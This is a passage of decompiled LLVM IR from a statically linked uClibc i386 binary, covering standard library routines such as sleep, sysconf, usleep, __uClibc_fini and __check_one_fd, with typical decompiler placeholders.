  store i32 %v2_8053730, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_80537bc = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_80537bc = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_80537bc, i32 0)
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_80537c7 = load i32, i32* @esi, align 4
  %v1_80537c7 = load i32, i32* @ebx, align 4
  %v2_80537c7 = inttoptr i32 %v1_80537c7 to i32*
  store i32 %v0_80537c7, i32* %v2_80537c7, align 4
  %v0_805385c.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053852

dec_label_pc_80537ce:                             ; preds = %dec_label_pc_8053790
  %v3_80537ce = load i32, i32* %stack_var_-420, align 4
  %v12_80537ce = icmp eq i32 %v3_80537ce, 1
  %v2_80537da = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80537da, i32* @ebx, align 4
  %v1_80537e1 = icmp eq i1 %v12_80537ce, false
  br i1 %v1_80537e1, label %dec_label_pc_8053808, label %dec_label_pc_80537e3

dec_label_pc_80537e3:                             ; preds = %dec_label_pc_80537ce
  store i32 %v2_80537da, i32* %stack_var_-460, align 4
  %v2_80537e7 = bitcast i32* %stack_var_-24 to %timespec*
  %v3_80537e7 = call i32 @__libc_nanosleep(%timespec* %v2_80537e7, i32 %v2_80537da)
  store i32 %v3_80537e7, i32* %eax.global-to-local, align 4
  store i32 %v3_80537e7, i32* @edi, align 4
  %v1_80537ee = call i32 @__errno_location(i32 %v2_80537da)
  store i32 %v1_80537ee, i32* %eax.global-to-local, align 4
  store i32 %v1_80537ee, i32* @ebx, align 4
  %v1_80537f8 = inttoptr i32 %v1_80537ee to i32*
  %v2_80537f8 = load i32, i32* %v1_80537f8, align 4
  store i32 %v2_80537f8, i32* @esi, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_80537ff = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_80537ff = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_80537ff, i32 0)
  store i32 %v4_80537ff, i32* %eax.global-to-local, align 4
  %v0_8053804 = load i32, i32* @esi, align 4
  %v1_8053804 = load i32, i32* @ebx, align 4
  %v2_8053804 = inttoptr i32 %v1_8053804 to i32*
  store i32 %v0_8053804, i32* %v2_8053804, align 4
  %v0_805382e.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805382b

dec_label_pc_8053808:                             ; preds = %dec_label_pc_80537ce
  store i32 2, i32* %stack_var_-460, align 4
  %v3_805380e = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_805380e = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_805380e, i32 0)
  store i32 %v4_805380e, i32* %eax.global-to-local, align 4
  store i32 2, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053824

dec_label_pc_8053819:                             ; preds = %dec_label_pc_805374b
  %v2_805381b = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_805381b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053824

dec_label_pc_8053824:                             ; preds = %dec_label_pc_8053808, %dec_label_pc_8053819
  %storemerge3.pre-phi = phi i32 [ %v2_80537da, %dec_label_pc_8053808 ], [ %v2_805381b, %dec_label_pc_8053819 ]
  store i32 %storemerge3.pre-phi, i32* %stack_var_-460, align 4
  %v2_8053824 = bitcast i32* %stack_var_-24 to %timespec*
  %v3_8053824 = call i32 @__libc_nanosleep(%timespec* %v2_8053824, i32 %storemerge3.pre-phi)
  store i32 %v3_8053824, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805382b

dec_label_pc_805382b:                             ; preds = %dec_label_pc_80537e3, %dec_label_pc_8053824
  %v0_805382e = phi i32 [ %v0_805382e.pre, %dec_label_pc_80537e3 ], [ %v3_8053824, %dec_label_pc_8053824 ]
  %v1_805382e = icmp eq i32 %v0_805382e, 0
  br i1 %v1_805382e, label %dec_label_pc_805384b, label %dec_label_pc_8053832

dec_label_pc_8053832:                             ; preds = %dec_label_pc_805382b
  %v4_8053842 = load i32, i32* %stack_var_-24, align 4
  store i32 %v4_8053842, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053852

dec_label_pc_805384b:                             ; preds = %entry, %dec_label_pc_805382b
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053852

dec_label_pc_805384f:                             ; preds = %dec_label_pc_8053774, %dec_label_pc_805372f, %dec_label_pc_8053701
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053852

dec_label_pc_8053852:                             ; preds = %dec_label_pc_805384b, %dec_label_pc_8053832, %dec_label_pc_80537a6, %dec_label_pc_805384f
  %v0_805385c = phi i32 [ 0, %dec_label_pc_805384b ], [ %v4_8053842, %dec_label_pc_8053832 ], [ %v0_805385c.pre, %dec_label_pc_80537a6 ], [ -1, %dec_label_pc_805384f ]
  store i32 %v0_80536d7, i32* @ebx, align 4
  store i32 %v0_80536d6, i32* @esi, align 4
  store i32 %v0_80536d5, i32* @edi, align 4
  ret i32 %v0_805385c

; uselistorder directives
  uselistorder i32 %storemerge3.pre-phi, { 1, 0 }
  uselistorder i32 %v1_80537ee, { 1, 0, 2 }
  uselistorder i32 %v2_80537da, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_8053771, { 2, 1, 0 }
  uselistorder i32 %v2_8053730, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v2_8053717, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_80536fe, { 0, 1, 4, 3, 2 }
  uselistorder i32* %stack_var_-460, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9, 10 }
  uselistorder i32* %stack_var_-24, { 2, 0, 4, 1, 5, 3 }
  uselistorder i32* %edx.global-to-local, { 1, 3, 2, 0, 4 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 0, 23 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigismember, { 1, 0 }
  uselistorder i32 (i32, %_TYPEDEF_sigset_t*, i32)* @__GI_sigprocmask, { 0, 1, 2, 3, 6, 4, 5 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigaddset, { 3, 2, 0, 1, 4 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8053852, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805384b, { 1, 0 }
  uselistorder label %dec_label_pc_805382b, { 1, 0 }
  uselistorder label %dec_label_pc_8053824, { 1, 0 }
}

define i32 @sysconf(i32 %arg1) local_unnamed_addr {
entry:
  switch i32 %arg1, label %dec_label_pc_805387f [
    i32 0, label %dec_label_pc_805388f
    i32 1, label %dec_label_pc_8053974
    i32 2, label %dec_label_pc_8053899
    i32 3, label %dec_label_pc_80538a3
    i32 4, label %dec_label_pc_80538ad
    i32 5, label %dec_label_pc_8053943
    i32 6, label %dec_label_pc_80538b5
    i32 7, label %dec_label_pc_8053875
    i32 8, label %dec_label_pc_8053875
    i32 9, label %dec_label_pc_8053875
    i32 10, label %dec_label_pc_8053875
    i32 11, label %dec_label_pc_8053875
    i32 12, label %dec_label_pc_8053875
    i32 13, label %dec_label_pc_8053875
    i32 14, label %dec_label_pc_8053875
    i32 15, label %dec_label_pc_8053875
    i32 16, label %dec_label_pc_8053875
    i32 17, label %dec_label_pc_8053875
    i32 18, label %dec_label_pc_8053875
    i32 19, label %dec_label_pc_8053875
    i32 20, label %dec_label_pc_8053875
    i32 21, label %dec_label_pc_8053875
    i32 22, label %dec_label_pc_8053875
    i32 23, label %dec_label_pc_8053974
    i32 24, label %dec_label_pc_8053974
    i32 25, label %dec_label_pc_8053980
    i32 26, label %dec_label_pc_8053951
    i32 27, label %dec_label_pc_8053974
    i32 28, label %dec_label_pc_80538c7
    i32 29, label %dec_label_pc_805394a
    i32 30, label %dec_label_pc_80538bf
    i32 31, label %dec_label_pc_805395f
    i32 32, label %dec_label_pc_8053974
    i32 33, label %dec_label_pc_8053974
    i32 34, label %dec_label_pc_8053974
    i32 35, label %dec_label_pc_8053958
    i32 36, label %dec_label_pc_8053987
    i32 37, label %dec_label_pc_805398e
    i32 38, label %dec_label_pc_8053987
    i32 39, label %dec_label_pc_80538d1
    i32 40, label %dec_label_pc_8053995
    i32 41, label %dec_label_pc_8053974
    i32 42, label %dec_label_pc_805395f
    i32 43, label %dec_label_pc_805398e
    i32 44, label %dec_label_pc_805399c
    i32 45, label %dec_label_pc_805398e
    i32 46, label %dec_label_pc_805394a
    i32 47, label %dec_label_pc_805394a
    i32 48, label %dec_label_pc_805394a
    i32 49, label %dec_label_pc_8053974
    i32 50, label %dec_label_pc_8053974
    i32 51, label %dec_label_pc_805394a
    i32 52, label %dec_label_pc_805394a
    i32 53, label %dec_label_pc_8053974
    i32 54, label %dec_label_pc_8053974
    i32 55, label %dec_label_pc_8053974
    i32 56, label %dec_label_pc_8053974
    i32 57, label %dec_label_pc_8053974
    i32 58, label %dec_label_pc_8053974
    i32 59, label %dec_label_pc_8053974
    i32 60, label %dec_label_pc_8053974
    i32 61, label %dec_label_pc_8053974
    i32 62, label %dec_label_pc_8053974
    i32 63, label %dec_label_pc_8053974
    i32 64, label %dec_label_pc_8053974
    i32 65, label %dec_label_pc_8053974
    i32 66, label %dec_label_pc_8053974
    i32 67, label %dec_label_pc_8053875
    i32 68, label %dec_label_pc_8053875
    i32 69, label %dec_label_pc_8053958
    i32 70, label %dec_label_pc_8053958
    i32 71, label %dec_label_pc_8053958
    i32 72, label %dec_label_pc_805395f
    i32 73, label %dec_label_pc_8053966
    i32 74, label %dec_label_pc_805396d
    i32 75, label %dec_label_pc_80538db
    i32 76, label %dec_label_pc_805396d
    i32 77, label %dec_label_pc_8053875
    i32 78, label %dec_label_pc_8053875
    i32 79, label %dec_label_pc_8053875
    i32 80, label %dec_label_pc_8053875
    i32 81, label %dec_label_pc_8053875
    i32 82, label %dec_label_pc_8053875
    i32 83, label %dec_label_pc_8053875
    i32 84, label %dec_label_pc_8053875
    i32 85, label %dec_label_pc_8053974
    i32 86, label %dec_label_pc_8053974
    i32 87, label %dec_label_pc_8053951
    i32 88, label %dec_label_pc_80538e5
    i32 89, label %dec_label_pc_80538ef
    i32 90, label %dec_label_pc_8053966
    i32 91, label %dec_label_pc_8053875
    i32 92, label %dec_label_pc_8053875
    i32 93, label %dec_label_pc_8053875
    i32 94, label %dec_label_pc_8053875
    i32 95, label %dec_label_pc_805394a
    i32 96, label %dec_label_pc_8053974
    i32 97, label %dec_label_pc_8053974
    i32 98, label %dec_label_pc_8053875
    i32 99, label %dec_label_pc_8053875
    i32 100, label %dec_label_pc_8053875
    i32 101, label %dec_label_pc_80538f9
    i32 102, label %dec_label_pc_805393c
    i32 103, label %dec_label_pc_8053979
    i32 104, label %dec_label_pc_8053951
    i32 105, label %dec_label_pc_8053903
    i32 106, label %dec_label_pc_805395f
    i32 107, label %dec_label_pc_805395f
    i32 108, label %dec_label_pc_8053943
    i32 109, label %dec_label_pc_8053980
    i32 110, label %dec_label_pc_805399c
    i32 111, label %dec_label_pc_805393c
    i32 112, label %dec_label_pc_8053979
    i32 113, label %dec_label_pc_805399c
    i32 114, label %dec_label_pc_805390d
    i32 115, label %dec_label_pc_8053995
    i32 116, label %dec_label_pc_8053974
    i32 117, label %dec_label_pc_8053974
    i32 118, label %dec_label_pc_8053917
    i32 119, label %dec_label_pc_8053921
    i32 120, label %dec_label_pc_805398e
    i32 121, label %dec_label_pc_8053951
    i32 122, label %dec_label_pc_8053951
    i32 123, label %dec_label_pc_8053951
    i32 124, label %dec_label_pc_8053951
    i32 125, label %dec_label_pc_8053875
    i32 126, label %dec_label_pc_8053875
    i32 127, label %dec_label_pc_8053974
    i32 128, label %dec_label_pc_8053974
    i32 129, label %dec_label_pc_8053875
    i32 130, label %dec_label_pc_8053875
    i32 131, label %dec_label_pc_8053974
    i32 149, label %dec_label_pc_8053928
  ]

dec_label_pc_8053875:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_80539a1

dec_label_pc_805387f:                             ; preds = %entry
  %v1_805387f = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_8053884 = inttoptr i32 %v1_805387f to i32*
  store i32 22, i32* %v1_8053884, align 4
  br label %dec_label_pc_8053974

dec_label_pc_805388f:                             ; preds = %entry
  br label %dec_label_pc_80539a1

dec_label_pc_8053899:                             ; preds = %entry
  br label %dec_label_pc_80539a1

dec_label_pc_80538a3:                             ; preds = %entry
  br label %dec_label_pc_80539a1

dec_label_pc_80538ad:                             ; preds = %entry
  %v0_80538b0 = call i32 @getdtablesize()
  br label %dec_label_pc_80538b5

dec_label_pc_80538b5:                             ; preds = %entry, %dec_label_pc_80538ad
  br label %dec_label_pc_80539a1

dec_label_pc_80538bf:                             ; preds = %entry
  %v3_80538c2 = call i32 @__GI_getpagesize(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_80538c7

dec_label_pc_80538c7:                             ; preds = %entry, %dec_label_pc_80538bf
  br label %dec_label_pc_80539a1

dec_label_pc_80538d1:                             ; preds = %entry
  br label %dec_label_pc_80539a1

dec_label_pc_80538db:                             ; preds = %entry
  br label %dec_label_pc_80539a1

dec_label_pc_80538e5:                             ; preds = %entry
  br label %dec_label_pc_80539a1

dec_label_pc_80538ef:                             ; preds = %entry
  br label %dec_label_pc_80539a1

dec_label_pc_80538f9:                             ; preds = %entry
  br label %dec_label_pc_80539a1

dec_label_pc_8053903:                             ; preds = %entry
  br label %dec_label_pc_80539a1

dec_label_pc_805390d:                             ; preds = %entry
  br label %dec_label_pc_80539a1

dec_label_pc_8053917:                             ; preds = %entry
  br label %dec_label_pc_80539a1

dec_label_pc_8053921:                             ; preds = %entry
  br label %dec_label_pc_80539a1

dec_label_pc_8053928:                             ; preds = %entry
  %v5_805392e = call i32 @__GI_clock_getres(i32 1, %timespec* null, i32 149, i32 149)
  %v2_8053936 = icmp slt i32 %v5_805392e, 0
  %v1_8053938 = icmp eq i1 %v2_8053936, false
  br i1 %v1_8053938, label %dec_label_pc_805394a, label %dec_label_pc_8053974

dec_label_pc_805393c:                             ; preds = %entry, %entry
  br label %dec_label_pc_80539a1

dec_label_pc_8053943:                             ; preds = %entry, %entry
  br label %dec_label_pc_80539a1

dec_label_pc_805394a:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_8053928
  br label %dec_label_pc_80539a1

dec_label_pc_8053951:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_80539a1

dec_label_pc_8053958:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_80539a1

dec_label_pc_805395f:                             ; preds = %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_80539a1

dec_label_pc_8053966:                             ; preds = %entry, %entry
  br label %dec_label_pc_80539a1

dec_label_pc_805396d:                             ; preds = %entry, %entry
  br label %dec_label_pc_80539a1

dec_label_pc_8053974:                             ; preds = %dec_label_pc_8053928, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_805387f
  br label %dec_label_pc_80539a1

dec_label_pc_8053979:                             ; preds = %entry, %entry
  br label %dec_label_pc_80539a1

dec_label_pc_8053980:                             ; preds = %entry, %entry
  br label %dec_label_pc_80539a1

dec_label_pc_8053987:                             ; preds = %entry, %entry
  br label %dec_label_pc_80539a1

dec_label_pc_805398e:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_80539a1

dec_label_pc_8053995:                             ; preds = %entry, %entry
  br label %dec_label_pc_80539a1

dec_label_pc_805399c:                             ; preds = %entry, %entry, %entry
  br label %dec_label_pc_80539a1

dec_label_pc_80539a1:                             ; preds = %dec_label_pc_8053995, %dec_label_pc_805398e, %dec_label_pc_8053987, %dec_label_pc_8053980, %dec_label_pc_8053979, %dec_label_pc_805396d, %dec_label_pc_8053966, %dec_label_pc_805395f, %dec_label_pc_8053958, %dec_label_pc_8053951, %dec_label_pc_8053943, %dec_label_pc_805393c, %dec_label_pc_805394a, %dec_label_pc_8053921, %dec_label_pc_8053917, %dec_label_pc_805390d, %dec_label_pc_8053903, %dec_label_pc_80538f9, %dec_label_pc_80538ef, %dec_label_pc_80538e5, %dec_label_pc_80538db, %dec_label_pc_80538d1, %dec_label_pc_80538c7, %dec_label_pc_80538b5, %dec_label_pc_80538a3, %dec_label_pc_8053899, %dec_label_pc_805388f, %dec_label_pc_8053875, %dec_label_pc_8053974, %dec_label_pc_805399c
  %v0_80539a4 = phi i32 [ 255, %dec_label_pc_8053995 ], [ 2048, %dec_label_pc_805398e ], [ 99, %dec_label_pc_8053987 ], [ 20, %dec_label_pc_8053980 ], [ -128, %dec_label_pc_8053979 ], [ 1024, %dec_label_pc_805396d ], [ 4, %dec_label_pc_8053966 ], [ 32, %dec_label_pc_805395f ], [ 256, %dec_label_pc_8053958 ], [ 2147483647, %dec_label_pc_8053951 ], [ 16, %dec_label_pc_8053943 ], [ 127, %dec_label_pc_805393c ], [ 200112, %dec_label_pc_805394a ], [ 9, %dec_label_pc_8053921 ], [ 65535, %dec_label_pc_8053917 ], [ -32768, %dec_label_pc_805390d ], [ -2147483648, %dec_label_pc_8053903 ], [ 8, %dec_label_pc_80538f9 ], [ 500, %dec_label_pc_80538ef ], [ 4096, %dec_label_pc_80538e5 ], [ 16384, %dec_label_pc_80538db ], [ 1000, %dec_label_pc_80538d1 ], [ 32768, %dec_label_pc_80538c7 ], [ 6, %dec_label_pc_80538b5 ], [ 65536, %dec_label_pc_80538a3 ], [ 100, %dec_label_pc_8053899 ], [ 131072, %dec_label_pc_805388f ], [ 1, %dec_label_pc_8053875 ], [ -1, %dec_label_pc_8053974 ], [ 32767, %dec_label_pc_805399c ]
  ret i32 %v0_80539a4

; uselistorder directives
  uselistorder i32 32768, { 1, 0, 2 }
  uselistorder i32 1000, { 4, 0, 1, 5, 2, 3 }
  uselistorder i32 16384, { 0, 5, 6, 7, 8, 9, 10, 11, 1, 2, 3, 4 }
  uselistorder i32 -2147483648, { 4, 6, 0, 5, 7, 1, 2, 3 }
  uselistorder i32 (i32, i32, i32)* @__GI_getpagesize, { 1, 0 }
  uselistorder i32 ()* @getdtablesize, { 2, 1, 0 }
  uselistorder i32 149, { 1, 0, 2 }
  uselistorder i32 129, { 1, 0 }
  uselistorder i32 124, { 1, 0 }
  uselistorder i32 115, { 3, 0, 1, 2 }
  uselistorder i32 114, { 1, 0 }
  uselistorder i32 113, { 1, 0 }
  uselistorder i32 111, { 1, 0 }
  uselistorder i32 110, { 2, 0, 1 }
  uselistorder i32 109, { 1, 0 }
  uselistorder i32 108, { 1, 0 }
  uselistorder i32 107, { 1, 0 }
  uselistorder i32 106, { 1, 0 }
  uselistorder i32 105, { 1, 0 }
  uselistorder i32 103, { 1, 0 }
  uselistorder i32 99, { 1, 2, 0 }
  uselistorder i32 98, { 1, 0 }
  uselistorder i32 96, { 1, 0 }
  uselistorder i32 95, { 4, 2, 1, 3, 0 }
  uselistorder i32 94, { 1, 0 }
  uselistorder i32 93, { 1, 0 }
  uselistorder i32 92, { 1, 0 }
  uselistorder i32 91, { 1, 0 }
  uselistorder i32 90, { 1, 0 }
  uselistorder i32 89, { 1, 0 }
  uselistorder i32 87, { 1, 2, 0 }
  uselistorder i32 86, { 1, 0 }
  uselistorder i32 85, { 1, 0 }
  uselistorder i32 83, { 1, 0 }
  uselistorder i32 82, { 1, 0 }
  uselistorder i32 81, { 1, 0 }
  uselistorder i32 79, { 1, 0 }
  uselistorder i32 78, { 1, 0 }
  uselistorder i32 77, { 1, 0 }
  uselistorder i32 76, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 74, { 1, 0 }
  uselistorder i32 73, { 1, 0 }
  uselistorder i32 71, { 1, 0 }
  uselistorder i32 70, { 2, 3, 1, 0 }
  uselistorder i32 66, { 1, 0 }
  uselistorder i32 65, { 2, 1, 0, 3, 4 }
  uselistorder i32 63, { 1, 2, 0 }
  uselistorder i32 62, { 1, 0 }
  uselistorder i32 61, { 1, 0 }
  uselistorder i32 59, { 1, 0 }
  uselistorder i32 57, { 1, 0 }
  uselistorder i32 55, { 1, 2, 0 }
  uselistorder i32 54, { 1, 0 }
  uselistorder i32 53, { 2, 1, 0 }
  uselistorder i32 50, { 3, 0, 1, 2 }
  uselistorder i32 49, { 1, 0 }
  uselistorder i32 47, { 1, 0 }
  uselistorder i32 39, { 1, 0 }
  uselistorder i32 38, { 2, 3, 1, 0 }
  uselistorder i32 30, { 7, 2, 8, 1, 3, 4, 0, 5, 6 }
  uselistorder i32 29, { 1, 0 }
  uselistorder i32 26, { 3, 2, 1, 0 }
  uselistorder i32 25, { 1, 2, 0 }
  uselistorder i32 23, { 2, 3, 1, 0 }
  uselistorder i32 19, { 3, 2, 0, 1 }
  uselistorder i32 18, { 1, 0 }
  uselistorder i32 13, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_80539a1, { 29, 0, 1, 2, 3, 4, 28, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_8053974, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_805394a, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_80538c7, { 1, 0 }
  uselistorder label %dec_label_pc_80538b5, { 1, 0 }
}

define i32 @usleep(i64 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_80539b8 = and i64 %arg1, 4294967295
  %v8_80539b8 = udiv i64 %v2_80539b8, 1000000
  %v9_80539b8 = trunc i64 %v8_80539b8 to i32
  store i32 %v9_80539b8, i32* %stack_var_-8, align 4
  %v2_80539cf = bitcast i32* %stack_var_-8 to %timespec*
  %v3_80539cf = call i32 @__libc_nanosleep(%timespec* %v2_80539cf, i32 0)
  ret i32 %v3_80539cf

; uselistorder directives
  uselistorder i32 (%timespec*, i32)* @__libc_nanosleep, { 2, 0, 1 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80539d8 = load i32, i32* @ebx, align 4
  store i32 %v0_80539d8, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8061000.767 to i32), i32 -134615040), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8061000.767 to i32), i32 -134615040), i32 2), i32 0), label %dec_label_pc_80539ec, label %dec_label_pc_80539f9

dec_label_pc_80539ec:                             ; preds = %entry, %dec_label_pc_80539ec
  %v1_80539f36 = phi i32 [ %v1_80539f3, %dec_label_pc_80539ec ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8061000.767 to i32), i32 -134615040), i32 2), i32 -1), %entry ]
  store i32 ptrtoint (i32* @global_var_80539f3.768 to i32), i32* %stack_var_-16, align 4
  %v5_80539ec = mul i32 %v1_80539f36, 4
  %v6_80539ec = add i32 %v5_80539ec, ptrtoint (i32* @global_var_8061000.767 to i32)
  %v7_80539ec = inttoptr i32 %v6_80539ec to i32*
  %v8_80539ec = load i32, i32* %v7_80539ec, align 4
  call void @__pseudo_call(i32 %v8_80539ec)
  %v0_80539f3.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_80539f3 = add i32 %v0_80539f3.pre, -1
  store i32 %v1_80539f3, i32* %ebx.global-to-local, align 4
  %v10_80539f4 = icmp eq i32 %v0_80539f3.pre, 0
  %v1_80539f7 = icmp eq i1 %v10_80539f4, false
  br i1 %v1_80539f7, label %dec_label_pc_80539ec, label %dec_label_pc_80539f9

dec_label_pc_80539f9:                             ; preds = %dec_label_pc_80539ec, %entry
  %v0_80539f9 = load i32, i32* @global_var_80677d4.769, align 4
  %v1_80539fe = icmp eq i32 %v0_80539f9, 0
  br i1 %v1_80539fe, label %dec_label_pc_8053a04, label %dec_label_pc_8053a02

dec_label_pc_8053a02:                             ; preds = %dec_label_pc_80539f9
  %v0_8053a02 = load i32, i32* %stack_var_-16, align 4
  %v1_8053a02 = call i32 @unknown_0(i32 %v0_8053a02)
  br label %dec_label_pc_8053a04

dec_label_pc_8053a04:                             ; preds = %dec_label_pc_8053a02, %dec_label_pc_80539f9
  %v0_8053a04 = load i32, i32* @global_var_80677d8.770, align 8
  %v1_8053a0a = icmp eq i32 %v0_8053a04, 0
  br i1 %v1_8053a0a, label %dec_label_pc_8053a13, label %dec_label_pc_8053a0e

dec_label_pc_8053a0e:                             ; preds = %dec_label_pc_8053a04
  %v2_8053a10 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8053a10, i32* %ebx.global-to-local, align 4
  %v0_8053a11 = load i32, i32* %stack_var_-16, align 4
  %v1_8053a11 = call i32 @unknown_0(i32 %v0_8053a11)
  br label %dec_label_pc_8053a13

dec_label_pc_8053a13:                             ; preds = %dec_label_pc_8053a04, %dec_label_pc_8053a0e
  %v2_8053a13 = load i32, i32* %stack_var_-16, align 4
  %v2_8053a14 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8053a14, i32* @edx, align 4
  ret i32 %v2_8053a13

; uselistorder directives
  uselistorder i32 %v1_80539f3, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 2, 1, 0, 3 }
  uselistorder i32* %ebx.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8053a13, { 1, 0 }
  uselistorder label %dec_label_pc_80539ec, { 1, 0 }
}

define i32 @__pthread_return_0(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8053a1a = load i32, i32* @eax, align 4
  ret i32 %v0_8053a1a
}

define i32 @__check_one_fd() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8053a1b = load i32, i32* @esi, align 4
  %v0_8053a1c = load i32, i32* @ebx, align 4
  store i32 %v0_8053a1c, i32* %stack_var_-8, align 4
  %v0_8053a20 = load i32, i32* @eax, align 4
  store i32 %v0_8053a20, i32* @esi, align 4
  %v0_8053a22 = load i32, i32* @edx, align 4
  store i32 %v0_8053a22, i32* @ebx, align 4
  %v4_8053a27 = call i32 @__libc_fcntl(i32 %v0_8053a20, i32 1, i32 %tmp6)
  %v8_8053a2f = icmp eq i32 %v4_8053a27, -1
  %v1_8053a30 = icmp eq i1 %v8_8053a2f, false
  br i1 %v1_8053a30, label %dec_label_pc_8053a4b, label %dec_label_pc_8053a32

dec_label_pc_8053a32:                             ; preds = %entry
  %v0_8053a34 = load i32, i32* @ebx, align 4
  %v5_8053a3a = call i32 @__libc_open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8060b4c.771, i32 0, i32 0), i32 %v0_8053a34)
  %v1_8053a42 = load i32, i32* @esi, align 4
  %v12_8053a42 = icmp eq i32 %v5_8053a3a, %v1_8053a42
  br i1 %v12_8053a42, label %dec_label_pc_8053a4b, label %dec_label_pc_8053a46

dec_label_pc_8053a46:                             ; preds = %dec_label_pc_8053a32
  %v0_8053a46 = call i32 @abort()
  br label %dec_label_pc_8053a4b

dec_label_pc_8053a4b:                             ; preds = %dec_label_pc_8053a32, %entry, %dec_label_pc_8053a46
  %v2_8053a4b = load i32, i32* %stack_var_-12, align 4
  %v2_8053a4c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8053a4c, i32* @ebx, align 4
  store i32 %v0_8053a1b, i32* @esi, align 4
  ret i32 %v2_8053a4b

; uselistorder directives
  uselistorder i32 ()* @abort, { 0, 3, 2, 4, 1 }
  uselistorder i32 (i8*, i32)* @__libc_open, { 5, 2, 0, 1, 3, 4 }
  uselistorder i32 (i32, i32, i32)* @__libc_fcntl, { 0, 5, 9, 8, 7, 6, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_8053a4b, { 2, 0, 1 }
}

define i32 @__GI___uClibc_init() local_unnamed_addr {
entry:
  %v0_8053a52 = load i8, i8* @global_var_80677dc.772, align 4
  %v1_8053a52 = icmp eq i8 %v0_8053a52, 0
  %v1_8053a59 = icmp eq i1 %v1_8053a52, false
  br i1 %v1_8053a59, label %entry.dec_label_pc_8053a8b_crit_edge, label %dec_label_pc_8053a5b

